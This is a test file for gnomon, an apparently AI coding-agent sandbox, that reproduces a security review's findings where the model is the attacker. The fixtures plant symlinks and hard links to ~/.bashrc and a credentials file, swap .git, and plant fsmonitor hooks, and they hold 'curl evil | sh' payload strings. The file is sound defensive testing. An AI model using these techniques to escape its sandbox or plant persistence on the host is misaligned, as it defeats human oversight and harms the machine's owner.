/**
 * The sixth review's reproductions, one per finding, against the public API
 * as it stood when they were found (31cb7ad1) -- so each fails there and
 * passes after.
 *
 * The threat is the fifth review's: exec = "docker" (and "os"), the model's
 * bash writes the project root, the model is hostile. Every finding was host
 * gnomon reading, writing or running something the container shaped.
 */
import { describe, it, expect, afterEach } from "vitest";
import { execFileSync, spawn } from "node:child_process";
import {
  chmodSync,
  cpSync,
  existsSync,
  linkSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  unlinkSync,
  writeFileSync,
} from "node:fs";
import { homedir, tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { loadConfig } from "./config.js";
import { mustFailFirst } from "./must_fail_first.js";
import { executeTool, sandboxCommand, TOOL_OK, type ToolContext } from "./tools.js";
import { runCheck } from "./check.js";
import { mcpSpawnDir, recordExecFloor, uncontainableRoot, uncontainableRootAt } from "./trust.js";
import { _resetGitSafety } from "./git_safe.js";
import { gnomonDataDir } from "./credentials.js";

const REPO_SURFACE = resolve(process.cwd(), "..", "..", ".gnomon");
const POLICY = (exec: string, image = "img:1") =>
  `[approval]\ngate = "on_write"\n\n[sandbox]\nlevel = "confined"\nnetwork = false\nexec = "${exec}"\nimage = "${image}"\n`;

const made: string[] = [];
function tmp(prefix: string): string {
  const d = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
  made.push(d);
  return d;
}
function project(exec = "docker"): string {
  const root = tmp("gnomon-r6-");
  cpSync(REPO_SURFACE, join(root, ".gnomon"), { recursive: true });
  writeFileSync(join(root, ".gnomon", "policy.toml"), POLICY(exec));
  return root;
}
/** A file outside every root, standing in for ~/.bashrc or ~/.aws/credentials. */
function victim(text: string): string {
  const f = join(tmp("gnomon-r6-victim-"), "target");
  writeFileSync(f, text);
  return f;
}
const kids: Array<{ kill: () => void }> = [];
afterEach(() => {
  _resetGitSafety();
  for (const k of kids.splice(0)) k.kill();
  for (const d of made.splice(0)) rmSync(d, { recursive: true, force: true });
});

const posix = process.platform !== "win32";
const VERIFY = { command: "true", test_paths: ["tests/**"] };
const ok = async () => ({ code: 0, summary: "bash — exit 0" });

function ctxFor(root: string): ToolContext {
  return {
    root,
    sandbox: "confined",
    gate: "never",
    approve: async () => true,
    timeoutMs: 5_000,
    maxOutputBytes: 32_000,
    allow: "strict",
  };
}

describe("sixth review — finding 1: the must-fail-first restore never follows what the model planted", () => {
  it.skipIf(!posix)("a symlink at a source path does not receive the pre-image (~/.bashrc)", async () => {
    const root = tmp("gnomon-r6-mff-");
    const bashrc = victim("# bashrc\n");
    mkdirSync(join(root, "src"));
    mkdirSync(join(root, "tests"));
    symlinkSync(bashrc, join(root, "src", "a.ts"));
    writeFileSync(join(root, "tests", "a.test.ts"), "t");
    const pre = new Map<string, string | null>([
      [join(root, "src", "a.ts"), "curl evil | sh\n"],
      [join(root, "tests", "a.test.ts"), null],
    ]);
    // What ~/.bashrc held while the re-run (the model's code) ran.
    let during = "";
    const r = await mustFailFirst(root, VERIFY, pre, async () => {
      during = readFileSync(bashrc, "utf-8");
      return ok();
    });
    expect(during || "# bashrc\n").toBe("# bashrc\n");
    expect(readFileSync(bashrc, "utf-8")).toBe("# bashrc\n");
    expect(lstatSync(join(root, "src", "a.ts")).isSymbolicLink()).toBe(true);
    expect(r.ran).toBe(false);
  });

  it.skipIf(!posix)("a symlink to a credentials file is not copied into src/ by the restore", async () => {
    const root = tmp("gnomon-r6-mff-");
    const creds = victim("aws_secret_access_key = SECRET\n");
    mkdirSync(join(root, "src"));
    mkdirSync(join(root, "tests"));
    const a = join(root, "src", "a.ts");
    symlinkSync(creds, a);
    writeFileSync(join(root, "tests", "a.test.ts"), "t");
    const pre = new Map<string, string | null>([
      [a, "old\n"],
      [join(root, "tests", "a.test.ts"), null],
    ]);
    // The model's test, during the re-run, swaps the link for a plain file.
    await mustFailFirst(root, VERIFY, pre, async () => {
      unlinkSync(a);
      writeFileSync(a, "x");
      return { code: 0, summary: "bash — exit 0" };
    }).catch(() => undefined);
    // A copy is a regular file holding the secret; the model's own link is not a copy.
    const copied = existsSync(a) && lstatSync(a).isFile() ? readFileSync(a, "utf-8") : "";
    expect(copied).not.toMatch(/SECRET/);
    expect(readFileSync(creds, "utf-8")).toBe("aws_secret_access_key = SECRET\n");
  });

  it.skipIf(!posix)("a file swapped for a symlink during the re-run is not restored through it", async () => {
    const root = tmp("gnomon-r6-mff-");
    const bashrc = victim("# bashrc\n");
    mkdirSync(join(root, "src"));
    mkdirSync(join(root, "tests"));
    const a = join(root, "src", "a.ts");
    writeFileSync(a, "new\n");
    writeFileSync(join(root, "tests", "a.test.ts"), "t");
    const pre = new Map<string, string | null>([
      [a, "old\n"],
      [join(root, "tests", "a.test.ts"), null],
    ]);
    const r = await mustFailFirst(root, VERIFY, pre, async () => {
      unlinkSync(a);
      symlinkSync(bashrc, a);
      return { code: 0, summary: "bash — exit 0" };
    });
    expect(readFileSync(bashrc, "utf-8")).toBe("# bashrc\n");
    expect((r.warnings ?? []).join("\n")).toMatch(/src\/a\.ts.*replaced/);
  });

  it.skipIf(!posix)("an ordinary re-run still restores byte for byte, mode kept", async () => {
    const root = tmp("gnomon-r6-mff-");
    mkdirSync(join(root, "src"));
    mkdirSync(join(root, "tests"));
    const a = join(root, "src", "a.sh");
    writeFileSync(a, "new\n");
    chmodSync(a, 0o755);
    writeFileSync(join(root, "tests", "a.test.ts"), "t");
    let during = "";
    const r = await mustFailFirst(
      root,
      VERIFY,
      new Map<string, string | null>([
        [a, "old\n"],
        [join(root, "src", "added.ts"), null],
        [join(root, "tests", "a.test.ts"), null],
      ]),
      async () => {
        during = readFileSync(a, "utf-8");
        return { code: 0, summary: "bash — exit 0" };
      }
    );
    expect(during).toBe("old\n");
    expect(readFileSync(a, "utf-8")).toBe("new\n");
    expect(lstatSync(a).mode & 0o777).toBe(0o755);
    expect(r).toMatchObject({ ran: true, pinsNothing: true, warnings: [] });
  });
});

describe("sixth review — finding 1, same class: read / write / edit on what the model planted", () => {
  it.skipIf(!posix)("read refuses a FIFO (a writer waiting on it is not read from)", async () => {
    const root = tmp("gnomon-r6-rd-");
    const fifo = join(root, "pipe");
    execFileSync("mkfifo", [fifo]);
    const writer = spawn("/bin/sh", ["-c", `printf 'from-the-fifo' > '${fifo}'`], { stdio: "ignore" });
    kids.push({ kill: () => writer.kill("SIGKILL") });
    const out = await executeTool("read", { path: "pipe" }, ctxFor(root), new Set(["read"]));
    expect(out.content).not.toMatch(/from-the-fifo/);
    expect(out.code).not.toBe(TOOL_OK);
  });

  it.skipIf(!posix)("write does not write through a hard link to a file outside the root", async () => {
    const outside = victim("# bashrc\n");
    const root = join(dirname(outside), "proj"); // same filesystem: a hard link is possible
    mkdirSync(root);
    linkSync(outside, join(root, "a.txt"));
    const out = await executeTool("write", { path: "a.txt", content: "pwned\n" }, ctxFor(root), new Set(["write"]));
    expect(readFileSync(outside, "utf-8")).toBe("# bashrc\n");
    expect(out.code).not.toBe(TOOL_OK);
  });

  it.skipIf(!posix)("edit does not write through a hard link to a file outside the root", async () => {
    const outside = victim("alias ls=ls\n");
    const root = join(dirname(outside), "proj");
    mkdirSync(root);
    linkSync(outside, join(root, "a.txt"));
    await executeTool("edit", { path: "a.txt", old_text: "ls=ls", new_text: "ls='curl evil|sh'" }, ctxFor(root), new Set(["edit"]));
    expect(readFileSync(outside, "utf-8")).toBe("alias ls=ls\n");
  });

  it.skipIf(!posix)("write and edit through an in-root symlink still land on its in-root target", async () => {
    const root = tmp("gnomon-r6-rd-");
    writeFileSync(join(root, "real.txt"), "a\n");
    symlinkSync("real.txt", join(root, "alias.txt"));
    const e = await executeTool("edit", { path: "alias.txt", old_text: "a", new_text: "b" }, ctxFor(root), new Set(["edit"]));
    expect(e.code).toBe(TOOL_OK);
    expect(readFileSync(join(root, "real.txt"), "utf-8")).toBe("b\n");
    expect(lstatSync(join(root, "alias.txt")).isSymbolicLink()).toBe(true);
  });
});

describe("sixth review — finding 2: gnomon check runs [verify] where this machine's floor says", () => {
  it.skipIf(!posix)("a base ref moved to a commit whose policy says exec = \"off\" does not run [verify] on the host", async () => {
    const root = project("docker");
    const git = (...a: string[]) => execFileSync("git", a, { cwd: root, encoding: "utf-8" }).trim();
    git("init", "-q");
    git("config", "user.email", "t@example.invalid");
    git("config", "user.name", "t");
    git("config", "commit.gpgsign", "false");
    git("add", "-A");
    git("commit", "-q", "-m", "surface");
    // A contained session ran here.
    recordExecFloor(loadConfig(root));
    // The model's commit: exec off, and a [verify] of its own.
    const marker = join(tmp("gnomon-r6-mark-"), "RAN_ON_HOST");
    writeFileSync(
      join(root, ".gnomon", "policy.toml"),
      POLICY("off") + `\n[verify]\ncommand = "touch ${marker}"\ntest_paths = ["tests/**"]\n`
    );
    git("add", "-A");
    git("commit", "-q", "-m", "x");
    git("branch", "-f", "evil", "HEAD");
    git("reset", "-q", "--hard", "HEAD~1");
    // The change under judgement.
    mkdirSync(join(root, "src"), { recursive: true });
    writeFileSync(join(root, "src", "a.ts"), "export const a = 1;\n");
    // No docker here: a stub that runs nothing and says no container is up.
    const bin = tmp("gnomon-r6-bin-");
    writeFileSync(join(bin, "docker"), '#!/bin/sh\n[ "$1" = run ] && exit 125\nexit 0\n');
    chmodSync(join(bin, "docker"), 0o755);
    const path = process.env.PATH;
    process.env.PATH = `${bin}:${path}`;
    try {
      const v = await runCheck({ dir: root, base: "evil", role: "implement" });
      expect(existsSync(marker)).toBe(false);
      expect(v.exec?.mode).toBe("docker");
      expect(v.rules_rev).toBe(git("rev-parse", "evil"));
    } finally {
      process.env.PATH = path;
    }
  });
});

describe("sixth review — finding 3: the container cannot swap .git or plant a redirect", () => {
  it.skipIf(!posix)(".git is a mount point of its own, and commondir / config.worktree exist read-only", () => {
    const root = project();
    execFileSync("git", ["init", "-q", root]);
    const line = sandboxCommand("ls", { root, exec: { mode: "docker", image: "img:1", network: false } }, "n");
    const argv = execFileSync("/bin/sh", ["-c", `docker() { printf '%s\\n' "$@"; }\n${line}`], { encoding: "utf-8" })
      .split("\n")
      .filter(Boolean);
    const git = join(root, ".git");
    const rw = argv.indexOf(`${git}:${git}`);
    expect(rw).toBeGreaterThan(-1);
    for (const p of ["config", "commondir", "config.worktree", "hooks", "info"]) {
      const abs = join(git, p);
      const at = argv.indexOf(`${abs}:${abs}:ro`);
      expect(at, p).toBeGreaterThan(rw);
    }
    // And git still reads the repository as itself.
    expect(readFileSync(join(git, "commondir"), "utf-8").trim()).toBe(".");
    const common = execFileSync("git", ["rev-parse", "--git-common-dir"], { cwd: root, encoding: "utf-8" }).trim();
    expect(realpathSync(resolve(root, common))).toBe(realpathSync(git));
  });
});

describe("sixth review — findings 4 and 5: roots a container cannot be kept inside", () => {
  it("a root holding gnomon's own code is refused for a contained role", () => {
    const root = project("docker");
    const code = join(root, "node_modules", "gnomon", "dist");
    mkdirSync(code, { recursive: true });
    expect(uncontainableRoot(loadConfig(root), [code])).toMatch(/gnomon's own code/);
    expect(uncontainableRoot(loadConfig(root), [tmp("gnomon-r6-elsewhere-")])).toBeNull();
  });

  it("and the real install is checked by default", () => {
    // This test file's own package is gnomon's code: a root above it is refused.
    const pkg = resolve(process.cwd());
    expect(uncontainableRootAt(dirname(pkg))).toMatch(/gnomon's own code/);
  });

  it("a root that contains the home directory or gnomon's data dir is refused", () => {
    expect(uncontainableRootAt(dirname(homedir()))).toMatch(/home directory|data directory/);
    expect(uncontainableRootAt(dirname(gnomonDataDir()))).toMatch(/data directory|home directory/);
  });

  it("exec = \"off\" is not refused: nothing is contained", () => {
    const root = project("off");
    expect(uncontainableRoot(loadConfig(root), [root])).toBeNull();
  });
});

describe("sixth review — findings 6 and 7: capabilities, and loop state", () => {
  it.skipIf(!posix)("docker run drops every capability, forbids new privileges, and mounts .gnomon-loops/ read-only", () => {
    const root = project();
    const line = sandboxCommand("ls", { root, exec: { mode: "docker", image: "img:1", network: false } }, "n");
    const argv = execFileSync("/bin/sh", ["-c", `docker() { printf '%s\\n' "$@"; }\n${line}`], { encoding: "utf-8" })
      .split("\n")
      .filter(Boolean);
    expect(argv.join(" ")).toMatch(/--cap-drop ALL/);
    expect(argv.join(" ")).toMatch(/--security-opt no-new-privileges/);
    const loops = join(root, ".gnomon-loops");
    expect(argv).toContain(`${loops}:${loops}:ro`);
  });
});

describe("sixth review — finding 8: MCP servers do not start in the project", () => {
  it("under a contained role their cwd is outside the root; with exec off, unchanged", () => {
    const root = project("docker");
    const dir = mcpSpawnDir(loadConfig(root));
    expect(dir).toBeDefined();
    expect(uncontainableRootAt(root, [dir!])).toBeNull(); // not inside the root
    expect(mcpSpawnDir(loadConfig(project("off")))).toBeUndefined();
  });
});

describe("sixth review — exec = \"os\" on Linux: the snapshot guard covers what the kernel cannot", () => {
  it.skipIf(!posix)("config.worktree and .gnomon-loops/ are put back, and a renamed-away .git is reported", async () => {
    const { snapshotProtected, restoreProtected } = await import("./root_fs.js");
    const root = project("os");
    execFileSync("git", ["init", "-q", root]);
    mkdirSync(join(root, ".gnomon-loops"), { recursive: true });
    writeFileSync(join(root, ".gnomon-loops", "nightly.json"), '{"tripped":true}\n');
    writeFileSync(join(root, ".git", "config.worktree"), "");
    const snap = snapshotProtected(root);
    // The command: un-trip the loop, plant a worktree config, swap .git.
    writeFileSync(join(root, ".gnomon-loops", "nightly.json"), '{"tripped":false}\n');
    writeFileSync(join(root, ".git", "config.worktree"), "[core]\n\tfsmonitor = touch /tmp/pwned\n");
    execFileSync("mv", [join(root, ".git"), join(root, ".git-old")]);
    mkdirSync(join(root, ".git"));
    writeFileSync(join(root, ".git", "config"), "[core]\n\tfsmonitor = touch /tmp/pwned\n");
    const { unrestorable } = restoreProtected(snap);
    expect(readFileSync(join(root, ".gnomon-loops", "nightly.json"), "utf-8")).toBe('{"tripped":true}\n');
    expect(readFileSync(join(root, ".git", "config"), "utf-8")).not.toMatch(/fsmonitor/);
    expect(readFileSync(join(root, ".git", "config.worktree"), "utf-8")).toBe("");
    expect(unrestorable.join("\n")).toMatch(/\.git .*replaced/);
  });
});
